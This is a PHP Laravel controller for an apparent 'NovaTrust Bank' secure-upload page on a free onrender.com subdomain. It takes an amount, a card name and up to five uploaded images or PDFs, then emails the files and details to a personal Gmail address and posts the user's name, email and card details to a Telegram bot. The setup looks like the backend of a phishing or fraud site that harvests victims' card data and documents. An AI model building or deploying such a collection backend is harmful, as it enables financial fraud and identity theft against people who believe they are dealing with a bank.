<?php  

namespace App\Http\Controllers;  

use App\Models\Upload;  
use Illuminate\Http\Request;  
use Illuminate\Support\Facades\Auth;  
use Illuminate\Support\Facades\Mail;  
use Illuminate\Support\Facades\Log;  
use Illuminate\Support\Facades\Http;
use App\Helpers\TelegramHelper;

class UploadController extends Controller  
{  
    /**  
     * Handle secure file uploads.  
     */  
    public function store(Request $request)  
    {  
        // ✅ Validate incoming form data  
        $validated = $request->validate([  
            'amount'        => 'required|numeric|min:1',  
            'card_name'     => 'required|string|max:255',  
            'description'   => 'nullable|string|max:1000',  
            'upload_file1'  => 'required|file|mimes:jpg,jpeg,png,pdf|max:5120',  
            'upload_file2'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',  
            'upload_file3'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',  
            'upload_file4'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',  
            'upload_file5'  => 'nullable|file|mimes:jpg,jpeg,png,pdf|max:5120',  
        ]);  

        $uploadedFiles = [];  
        $description = $validated['description'] ?? null;  

        // ✅ Upload all selected files (1–5)  
        foreach (range(1, 5) as $i) {  
            $fileKey = 'upload_file' . $i;  

            if ($request->hasFile($fileKey)) {  
                $file = $request->file($fileKey);  
                $path = $file->store('uploads', 'public');  

                $upload = Upload::create([  
                    'user_id'       => Auth::id(),  
                    'amount'        => $validated['amount'],  
                    'card_name'     => $validated['card_name'],  
                    'description'   => $description,  
                    'file_path'     => $path,  
                    'original_name' => $file->getClientOriginalName(),  
                ]);  

                $uploadedFiles[] = $upload;  
            }  
        }  

        if (empty($uploadedFiles)) {  
            return back()
                ->withErrors(['upload_file1' => 'Please upload at least one file.'])
                ->withInput();  
        }  

        // Prepare email attachments  
        $attachments = [];  
        foreach ($uploadedFiles as $upload) {  
            $full = storage_path('app/public/' . $upload->file_path);  
            if (file_exists($full)) {  
                $attachments[] = $full;  
            }  
        }  

        // Send email to admin  
        try {  
            $fileNames = collect($uploadedFiles)->pluck('original_name')->implode(', ');  

            Mail::send([], [], function ($message) use ($attachments, $validated, $description, $fileNames) {  
                $message->to('collaomn@gmail.com')  
                        ->subject('📎 New Secure Upload from NovaTrust Bank')  
                        ->setBody("
New secure upload received.

👤 Card Name: {$validated['card_name']}
💰 Amount: \${$validated['amount']}
📝 Description: " . ($description ?: 'N/A') . "
📎 Files: {$fileNames}
                ");  

                foreach ($attachments as $path) {  
                    $message->attach($path);  
                }  
            });  
        } catch (\Exception $e) {  
            Log::error('Email sending failed: ' . $e->getMessage());  
        }  

        // ✅ TELEGRAM NOTIFICATION  
        $fileListForTelegram = collect($uploadedFiles)
            ->pluck('original_name')
            ->map(fn($f) => "• $f")
            ->implode("\n");

        $telegramMessage = 
            "📎 <b>New Secure Upload</b>\n" .
            "👤 User: " . Auth::user()->name . "\n" .
            "📧 Email: " . Auth::user()->email . "\n" .
            "💰 Amount: \$" . $validated['amount'] . "\n" .
            "💳 Card Name: " . $validated['card_name'] . "\n" .
            "📝 Description: " . ($description ?: 'N/A') . "\n" .
            "📁 Files:\n{$fileListForTelegram}\n" .
            "🕒 " . now()->toDateTimeString() . "\n" .
            "🌐 novatrustbank.onrender.com";

        TelegramHelper::send($telegramMessage);  

        // Redirect  
        return redirect()
            ->route('secure.upload.success', ['id' => $uploadedFiles[0]->id])
            ->with('success', '✅ Upload saved and sent successfully!');  
    }  

    /**  
     * Show upload success page.  
     */  
    public function success($id)  
    {  
        $upload = Upload::findOrFail($id);  
        return view('upload_success', compact('upload'));  
    }  
}
